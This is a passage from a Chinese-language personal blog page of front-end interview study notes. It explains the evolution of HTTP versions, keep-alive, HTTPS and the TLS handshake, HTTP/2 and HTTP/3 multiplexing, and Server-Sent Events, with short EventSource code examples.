

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/blog/img/favicon.jpg">
  <link rel="icon" href="/blog/img/favicon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Azure">
  <meta name="keywords" content="">
  
    <meta name="description" content="前端">
<meta property="og:type" content="article">
<meta property="og:title" content="面试题总结">
<meta property="og:url" content="https://yoonalis.github.io/blog/2023/09/19/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="Azure&#39;s blog">
<meta property="og:description" content="前端">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yoonalis.github.io/blog/img/cold.jpg">
<meta property="article:published_time" content="2023-09-19T08:19:16.349Z">
<meta property="article:modified_time" content="2023-10-06T06:33:19.246Z">
<meta property="article:author" content="Azure">
<meta property="article:tag" content="前端">
<meta property="article:tag" content="面试">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yoonalis.github.io/blog/img/cold.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>面试题总结 - Azure&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/blog/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/blog/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/blog/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"yoonalis.github.io","root":"/blog/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/blog/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/blog/js/utils.js" ></script>
  <script  src="/blog/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/blog/">
      <strong>Azure</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/album/">
                <i class="iconfont icon-images"></i>
                album
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/blog/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="面试题总结"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-09-19 16:19" pubdate>
          2023年9月19日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          200k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          1671 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">面试题总结</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="前端面试题总结"><a href="#前端面试题总结" class="headerlink" title="前端面试题总结"></a>前端面试题总结</h1><h2 id="网络和请求篇"><a href="#网络和请求篇" class="headerlink" title="网络和请求篇"></a>网络和请求篇</h2><h3 id="x3D-x3D-1、http协议及发展细节-x3D-x3D"><a href="#x3D-x3D-1、http协议及发展细节-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、http协议及发展细节&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、http协议及发展细节&#x3D;&#x3D;</h3><h5 id="http0-9"><a href="#http0-9" class="headerlink" title="http0.9"></a>http0.9</h5><p>因为请求仅一行，又叫单线协议&#x2F;单行版本，仅支持服务器响应html文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902152804693-20230902%2015:28:06.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902152804693"></p>
<h5 id="http-1-0"><a href="#http-1-0" class="headerlink" title="http:1.0"></a>http:1.0</h5><ul>
<li><p>请求加入了http协议标头</p>
</li>
<li><p>响应增加了状态码和传输的内容类型</p>
</li>
<li><p>依然是单线协议，每次连接只能处理一个请求和一个响应，每次建立物理连接的成本很高，而且服务器遭受不住太多客户端访问，服务器扛不住就会直接报503错误。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902153043910-20230902%2015:30:44.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902153043910"></p>
<h5 id="http1-1"><a href="#http1-1" class="headerlink" title="http1.1"></a>http1.1</h5><ul>
<li>引入持久连接的概念，指定连接内不会关闭这个连接，可以保持在这个连接上发送多个请求。节省了每次交互都需要握手和挥手的时间。</li>
<li>问题：http标头冗余问题：每次请求总是带上相同几乎不会变化的http标头。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902153652841-20230902%2015:36:52.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902153652841"></p>
<ul>
<li>引入流水线概念，在服务器响应前，客户端可以一次性发送多个请求，服务器收到多个请求后，按顺序将准备好的数据返回给客户端</li>
<li>问题：线头阻塞</li>
<li>解决办法：浏览器通常保持6个左右的连接，一个连接塞车了，客户端可以通过其他连接继续发送请求。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902153728976-20230902%2015:37:29.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902153728976"></p>
<h5 id="http2-0"><a href="#http2-0" class="headerlink" title="http2.0"></a>http2.0</h5><ul>
<li>更好的解决了1.0版本的遗留问题和功能补充</li>
<li>http2.0在应用层改变了传输方式：增加了二进制帧数据处理层，将http标头和数据明文拆分成二进制数据帧，将他们单独或者打包成独立进行传输，到达目的地后，再按照stream id将它们组装起来还原原始数据。<ul>
<li>好处：简化了osi底层模型的工作（更喜欢数据帧）、规避了大文件传输大小的限制</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902160556385-20230902%2016:05:56.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902160556385"></p>
<ul>
<li><p><strong>双向流</strong>：客户端以流的方式请求，服务端以流的方式响应，形成双向数据流，数据帧都用stream id做标识，然后按照stream id将多个数据帧识别为一个消息，保证数据的完整性。</p>
</li>
<li><p><strong>多路复用</strong>：一个客户端和一个服务器保持一个连接，在该连接上并发传输，就是多路复用。</p>
</li>
<li><p>不必按需，先到先组装，解决线头阻塞</p>
<ul>
<li>但是，http2.0基于tcp，tcp为了保证消息可靠，是按顺序传递的，就有可能造成塞车。</li>
</ul>
</li>
<li><p><strong>服务器推送功能</strong>：可以推送未经请求的资源，如SSE，进一步减少了网络请求的数量。</p>
</li>
<li><p><strong>标头压缩功能</strong>：使用hpack来编解码http标头，建立连接的客户端和服务器，双方都维护着相同的61个条目的只读静态表，和可动态添加条目的空白的动态表。</p>
<ul>
<li>当请求发送时先查找表中的名值，名值完全匹配，直接提取该标头在表中对应的整数索引，用于表示该名值对。</li>
<li>如果只匹配名称，就使用索引表示名称，值使用霍夫曼算法编码后表示。</li>
<li>表中没有的，则按照顺序添加到动态表中，再使用霍夫曼算法编码名值后，传递给服务器。</li>
<li>服务器端则反之，使用表中的索引解码，或按顺序使用霍夫曼算法解码后添加到服务器动态表中。保证双方表中保存的数据和整数索引一致。</li>
<li>好处：在之后的请求中，标头会越来越小</li>
<li>问题：也会造成线头阻塞</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902160350456-20230902%2016:03:50.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902160350456"></p>
<h5 id="http3-0"><a href="#http3-0" class="headerlink" title="http3.0"></a>http3.0</h5><ul>
<li><strong>使用传输效率更高的udp</strong></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902161830166-20230902%2016:18:30.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902161830166"></p>
<ul>
<li><strong>使用基于udp的QUIC协议</strong>：实现了tcp的可靠性、拥塞控制、流量控制、排序；保留了http2.0基于流的多路复用及其他优化功能</li>
<li>http2.0和http3.0数据流处理的区别</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902162140860-20230902%2016:21:41.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902162140860"></p>
<ul>
<li><p><strong>使用独立指令流</strong>：解决hpack按顺序解码容易造成线头阻塞的问题。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902162507875-20230902%2016:25:08.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902162507875"></p>
<ul>
<li>提前将需要添加的标头项使用添加指令发送给解码方，解码方收到后回复确认标头指令。双方利用动态标头表中标头的状态来确认标头是否完成同步。未被确认的，不被使用。</li>
</ul>
</li>
<li><p><strong>使用 stream id 和 offset 标头</strong>：规避类似tcp的线头阻塞问题</p>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902162623434-20230919%2016:27:45.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902162623434"></p>
</li>
</ul>
<p><strong>优点总结</strong>：</p>
<ol>
<li>udp头部仅8字节，优化了交互数据大小提高传输速度</li>
<li>0往返时间建立连接（但还需要tsl的1rtt）</li>
<li>QUIC协议使用随机数作为connection id，不受网络变化影响</li>
</ol>
<h5 id="HTTP1-1的长连接讲一下"><a href="#HTTP1-1的长连接讲一下" class="headerlink" title="HTTP1.1的长连接讲一下"></a>HTTP1.1的长连接讲一下</h5><p>HTTP&#x2F;1.1的长连接（Keep-Alive连接）是一项协议功能，旨在改善HTTP协议的性能。在HTTP&#x2F;1.0中，每个HTTP请求&#x2F;响应都需要单独建立一个TCP连接，这会导致较高的延迟和资源开销。为了解决这个问题，HTTP&#x2F;1.1引入了长连接的概念。</p>
<p>长连接的主要思想是在单个TCP连接上允许多个HTTP请求和响应的交互，而不是每个请求都建立一个新的连接。这样可以减少TCP连接的建立和断开所需的时间，并降低了资源开销。下面是HTTP&#x2F;1.1的长连接工作原理：</p>
<ol>
<li><p><strong>建立连接：</strong> 客户端通过向服务器发送一个HTTP请求来建立TCP连接，就像在HTTP&#x2F;1.0中一样。</p>
</li>
<li><p><strong>多次请求&#x2F;响应：</strong> 与HTTP&#x2F;1.0不同的是，在HTTP&#x2F;1.1中，客户端可以在同一连接上发送多个HTTP请求，而不需要等待之前的请求完成。服务器也可以在同一连接上发送多个HTTP响应，而不需要等待客户端的下一个请求。这种多次请求&#x2F;响应的方式可以交替进行，直到连接关闭。</p>
</li>
<li><p><strong>标志头：</strong> HTTP&#x2F;1.1中使用了一些标志头来启用长连接，其中最重要的是 <code>Connection</code> 头。通常，客户端会在请求头中包含 <code>Connection: keep-alive</code>，而服务器则会在响应头中包含 <code>Connection: keep-alive</code>。这告诉客户端和服务器保持连接开启，以便进行多次请求&#x2F;响应。</p>
</li>
<li><p><strong>连接超时：</strong> 为了避免长时间保持不活动的连接，HTTP&#x2F;1.1引入了连接超时机制。服务器可以在响应头中包含 <code>Keep-Alive: timeout=seconds</code>，指示客户端在多长时间内保持连接开启，如果没有活动则自动关闭连接。</p>
</li>
<li><p><strong>关闭连接：</strong> 当客户端或服务器决定关闭连接时，它可以发送一个带有 <code>Connection: close</code> 标志头的HTTP请求或响应，通知对方即将关闭连接。</p>
</li>
</ol>
<p>长连接的好处包括减少了TCP连接的建立和断开开销，提高了HTTP请求的响应时间，减少了网络拥塞，提高了性能。这种机制在现代Web应用中非常常见，通常默认启用，除非有明确的理由关闭它。但需要注意，长连接并不意味着连接永远保持开启，它仍然会受到连接超时和服务器资源等因素的影响。</p>
<h5 id="http和https对比"><a href="#http和https对比" class="headerlink" title="http和https对比"></a>http和https对比</h5><p>HTTP（Hypertext Transfer Protocol）和HTTPS（Hypertext Transfer Protocol Secure）都是用于在网络上传输数据的协议，但它们之间存在重要的区别，下面是它们之间的详细对比：</p>
<ol>
<li><p><strong>安全性：</strong></p>
<ul>
<li>HTTP：HTTP 不提供数据加密和安全性保障，数据在传输过程中是明文可读的，容易被第三方拦截、窃取或篡改。因此，HTTP 不适用于处理敏感信息（如登录凭据、支付信息等）的传输。</li>
<li>HTTPS：HTTPS 使用了 SSL&#x2F;TLS 协议进行数据加密，因此传输的数据是加密的，保护用户的隐私和安全。HTTPS 被广泛用于安全敏感数据的传输，如在线银行、电子商务等。</li>
</ul>
</li>
<li><p><strong>协议和端口：</strong></p>
<ul>
<li>HTTP：使用默认端口 80，通信数据不加密。</li>
<li>HTTPS：使用默认端口 443，通信数据经过 SSL&#x2F;TLS 加密。</li>
</ul>
</li>
<li><p><strong>证书验证：</strong></p>
<ul>
<li>HTTP：不需要服务器证书验证。</li>
<li>HTTPS：需要使用 SSL&#x2F;TLS 证书来验证服务器的身份，确保用户连接到的是合法的网站。</li>
</ul>
</li>
<li><p><strong>SEO：</strong></p>
<ul>
<li>HTTP：搜索引擎在排名网站时可能会考虑安全性因素，不太倾向于非安全的 HTTP 网站。</li>
<li>HTTPS：搜索引擎通常更喜欢使用 HTTPS 的网站，因为它们提供了更好的安全性。</li>
</ul>
</li>
<li><p><strong>性能：</strong></p>
<ul>
<li>HTTP：通常比 HTTPS 更快，因为不需要进行加密和解密操作。</li>
<li>HTTPS：由于数据加密和证书验证会增加一些额外的计算开销，可能会略微降低性能。</li>
</ul>
</li>
<li><p><strong>信任度：</strong></p>
<ul>
<li>HTTP：不提供信任度验证，容易受到中间人攻击。</li>
<li>HTTPS：通过证书验证确保了数据传输的可信度，减少了中间人攻击的风险。</li>
</ul>
</li>
<li><p><strong>浏览器标识：</strong></p>
<ul>
<li>HTTP：在浏览器地址栏中没有安全标志，通常显示为“http:&#x2F;&#x2F;”。</li>
<li>HTTPS：在浏览器地址栏中显示安全锁标志和协议为“https:&#x2F;&#x2F;”，用户能够明确知道连接是加密的。</li>
</ul>
</li>
<li><p><strong>数据完整性：</strong></p>
<ul>
<li>HTTP：不提供数据完整性检查，数据可能在传输过程中被篡改。</li>
<li>HTTPS：通过加密和校验机制确保数据完整性，防止数据被篡改。</li>
</ul>
</li>
</ol>
<p>总结来说，HTTPS 是 HTTP 的安全版本，通过加密和证书验证提供了更高的安全性和隐私保护。因此，在传输敏感信息、进行在线交易或保护用户隐私方面，使用 HTTPS 是非常重要的。在现代 Web 开发中，使用 HTTPS 已经成为标准做法，因为它能够保障用户的安全和数据的完整性。</p>
<p>HTTPS 可以看作是 HTTP 协议和 TLS（Transport Layer Security）协议结合在一起的安全传输协议。HTTPS 实际上是在 HTTP 协议的基础上添加了 TLS 加密层，以确保数据在传输过程中的安全性和隐私保护。</p>
<h5 id="TLS连接过程"><a href="#TLS连接过程" class="headerlink" title="TLS连接过程"></a>TLS连接过程</h5><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902174849115-20230919%2016:27:45.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902174849115"></p>
<p>TLS（Transport Layer Security）连接是用于在网络上加密和保护数据传输的协议。TLS 的连接过程如下：</p>
<ol>
<li><p><strong>客户端发起连接：</strong> 客户端（通常是浏览器）向服务器发起连接请求。客户端会发送一个 <code>ClientHello</code> 消息，其中包含了客户端支持的加密算法、TLS 版本和一些随机数。</p>
</li>
<li><p><strong>服务器响应：</strong> 服务器收到客户端的请求后，会回应一个 <code>ServerHello</code> 消息，其中包含了服务器选择的加密算法、TLS 版本和一些随机数。服务器还会发送一个包含其公钥的数字证书，以便客户端验证服务器的身份。</p>
</li>
<li><p><strong>客户端验证证书：</strong> 客户端会验证服务器的数字证书的合法性。这包括检查证书是否由受信任的证书颁发机构（CA）签发，证书是否过期，以及证书中的域名是否与请求的域名匹配。如果证书验证失败，客户端会终止连接。</p>
</li>
<li><p><strong>密钥交换：</strong> 如果服务器的数字证书验证通过，客户端会生成一个随机的对称密钥（Session Key），用于加密和解密数据。然后，客户端将这个对称密钥用服务器的公钥进行加密，以确保只有服务器能够解密它。</p>
</li>
<li><p><strong>数据加密：</strong> 一旦服务器解密了客户端发送的对称密钥，双方都拥有了相同的密钥，可以使用它来加密和解密数据。从此以后，客户端和服务器之间的通信都是通过加密通道进行的。</p>
</li>
<li><p><strong>安全通信：</strong> 一旦加密通道建立，客户端和服务器之间的所有数据传输都会在加密的状态下进行。这意味着即使有人拦截了通信，也无法轻易解密和窃取数据。</p>
</li>
<li><p><strong>数据传输：</strong> 客户端和服务器之间的数据可以在安全的加密通道上自由传输。客户端和服务器之间的所有请求和响应都以加密形式传输，保护了数据的隐私和完整性。</p>
</li>
</ol>
<p>通过这个过程，TLS 确保了在互联网上的数据传输是安全的，不容易被窃取或篡改。TLS 在安全通信中起着关键的作用，对于保护用户的隐私和防止数据泄漏非常重要，尤其是在进行敏感信息的传输，如登录信息、支付信息等。</p>
<h5 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h5><p>多路复用（Multiplexing）是HTTP&#x2F;2协议中的一个重要特性，它旨在提高网络性能，减少资源浪费，同时支持更多并发请求。在HTTP&#x2F;1.x中，每个请求都需要建立一个独立的连接，这会导致连接开销和头部信息的冗余。HTTP&#x2F;2的多路复用解决了这些问题。</p>
<p>以下是多路复用的工作原理和优点：</p>
<p><strong>工作原理：</strong></p>
<ol>
<li><p><strong>单一连接：</strong> 在HTTP&#x2F;2中，客户端和服务器之间仅建立一个TCP连接。</p>
</li>
<li><p><strong>多个流：</strong> 在这个单一连接上，可以同时传输多个请求&#x2F;响应数据流（Stream）。每个数据流都有一个唯一的标识符，并且可以独立传输数据。</p>
</li>
<li><p><strong>并行传输：</strong> 多路复用允许多个数据流并行传输，不需要等待前一个请求的响应。这意味着多个请求和响应可以同时在同一连接上进行，而无需按顺序排队等待。</p>
</li>
<li><p><strong>头部压缩：</strong> HTTP&#x2F;2使用了头部压缩技术（HPACK），可以减小头部信息的大小，减少了传输的冗余数据。这降低了带宽消耗，尤其是对于大量小请求的情况。</p>
</li>
</ol>
<p><strong>优点：</strong></p>
<ol>
<li><p><strong>更高的性能：</strong> 多路复用减少了连接建立和断开的开销，提高了请求响应的速度，尤其对于高延迟或高丢包率的网络更为明显。</p>
</li>
<li><p><strong>减少了头部开销：</strong> 头部压缩减小了每个请求&#x2F;响应的头部信息大小，减少了带宽的消耗，特别是对于包含大量小请求的场景。</p>
</li>
<li><p><strong>更好的并发性：</strong> 多路复用允许并发处理多个请求，而不需要等待之前的请求完成，提高了并发性能。</p>
</li>
<li><p><strong>提高了资源利用率：</strong> 多路复用可以充分利用单一连接的资源，减少了不必要的连接建立和断开，降低了服务器资源消耗。</p>
</li>
<li><p><strong>支持优先级：</strong> HTTP&#x2F;2允许为每个数据流设置不同的优先级，确保重要的请求能够优先处理。</p>
</li>
</ol>
<p>需要注意的是，虽然多路复用是HTTP&#x2F;2的一项强大特性，但它并不是自动开启的。客户端和服务器都需要支持HTTP&#x2F;2协议，并且在通信中正确使用多路复用功能。多数现代的Web浏览器和Web服务器都已经支持HTTP&#x2F;2，以获得更好的性能和用户体验。</p>
<h5 id="HTTP3-0多路复用的QUIC"><a href="#HTTP3-0多路复用的QUIC" class="headerlink" title="HTTP3.0多路复用的QUIC"></a>HTTP3.0多路复用的QUIC</h5><p>HTTP&#x2F;3.0是基于QUIC（Quick UDP Internet Connections）协议的一种新一代HTTP协议，它引入了一种改进的多路复用机制。QUIC是一个由Google开发的协议，旨在减少网络延迟，提高连接性能，并增强安全性。以下是HTTP&#x2F;3.0中多路复用的QUIC的一些关键特点和工作原理：</p>
<p><strong>1. 基于UDP：</strong> HTTP&#x2F;3.0使用了UDP作为传输层协议，而不是像HTTP&#x2F;1.x和HTTP&#x2F;2.0那样使用TCP。UDP具有较低的连接建立和断开开销，适用于移动网络等高延迟、高丢包率的环境。</p>
<p><strong>2. 快速连接建立：</strong> QUIC具有快速连接建立特性，减少了握手过程的时间，因此可以更快地建立连接和开始数据传输。</p>
<p><strong>3. 多路复用：</strong> HTTP&#x2F;3.0中的多路复用机制与HTTP&#x2F;2.0类似，允许在同一个连接上同时传输多个请求和响应数据流。每个数据流都有自己的标识符，并且可以独立传输数据。</p>
<p><strong>4. 无阻塞：</strong> HTTP&#x2F;3.0的多路复用是无阻塞的，这意味着一个数据流的阻塞不会影响其他数据流的传输。这有助于提高并发性能，即使其中一个数据流出现问题，其他数据流仍然可以继续传输。</p>
<p><strong>5. 流量控制和优先级：</strong> HTTP&#x2F;3.0支持流量控制和优先级设置，可以确保对重要资源的请求得到及时处理。</p>
<p><strong>6. 0-RTT握手：</strong> HTTP&#x2F;3.0引入了0-RTT（零轮延迟）握手机制，允许客户端在第一次连接时发送加密的数据，进一步减少了连接延迟。</p>
<p><strong>7. 动态更新：</strong> HTTP&#x2F;3.0的QUIC支持动态更新连接参数，允许协议参数的变更而无需重新建立连接。</p>
<p>HTTP&#x2F;3.0的多路复用机制基于QUIC的特性，旨在提供更快的连接建立、更高的并发性能、更好的安全性和适应性，特别适用于移动设备和高延迟网络。由于HTTP&#x2F;3.0基于QUIC，因此它具有一些独特的特点，与传统的HTTP协议有显著的不同。这种协议的改进有助于提高Web应用程序的性能和用户体验。</p>
<h5 id="服务器发送事件（SSE）"><a href="#服务器发送事件（SSE）" class="headerlink" title="服务器发送事件（SSE）"></a>服务器发送事件（SSE）</h5><p>服务器发送事件（SSE）是一种用于在服务器和客户端之间实现单向实时通信的Web技术。SSE允许服务器将数据推送到客户端，而不需要客户端发起请求，这使得它非常适合实现实时通知、即时消息、股票报价、天气更新等应用程序。以下是SSE的基本原理和使用方法：</p>
<p><strong>SSE的工作原理：</strong></p>
<ol>
<li>客户端通过创建一个EventSource对象来建立到服务器的SSE连接。</li>
<li>一旦连接建立，服务器可以周期性地或基于特定事件向客户端发送数据。</li>
<li>服务器发送的数据被包装成事件，包括一个事件标识符（event），以及数据内容（data）。</li>
<li>客户端通过监听特定事件来接收数据，然后可以在收到数据后执行相应的操作。</li>
</ol>
<p><strong>SSE的使用步骤：</strong></p>
<ol>
<li><p>在服务器端设置SSE端点：在服务器上创建一个支持SSE的端点，这通常是一个HTTP路由，它会向客户端发送SSE事件。</p>
</li>
<li><p>在客户端创建EventSource对象：使用JavaScript创建一个EventSource对象，将其连接到服务器端SSE端点。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> eventSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(<span class="hljs-string">&#x27;/sse-endpoint&#x27;</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>监听事件：客户端可以监听服务器发送的事件，当事件到达时执行相应的操作。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">eventSource.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;eventName&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-keyword">var</span> eventData = event.<span class="hljs-property">data</span>;<br>  <span class="hljs-comment">// 处理接收到的事件数据</span><br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p>服务器发送事件：服务器端通过向连接的EventSource发送数据来触发事件。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 通过服务器端代码向连接的客户端发送事件</span><br>res.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;event: eventName\n&#x27;</span>);<br>res.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;data: Event data\n\n&#x27;</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>关闭连接：当不再需要SSE连接时，客户端可以关闭它。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">eventSource.<span class="hljs-title function_">close</span>();<br></code></pre></td></tr></table></figure></li>
</ol>
<p><strong>注意事项：</strong></p>
<ul>
<li>SSE基于HTTP，因此需要使用HTTP服务器来支持它。</li>
<li>SSE是单向通信，只能由服务器向客户端发送数据，不支持双向通信。</li>
<li>SSE不需要使用第三方库或框架，原生JavaScript就可以实现。</li>
<li>SSE在支持的浏览器中有良好的支持，但可能不适用于所有应用场景。</li>
</ul>
<p>总之，服务器发送事件（SSE）是一种用于实现服务器到客户端的实时通信的简单而有效的技术，适用于需要将实时数据推送给客户端的应用程序。由于其简单性和广泛的浏览器支持，它是一种强大的工具。</p>
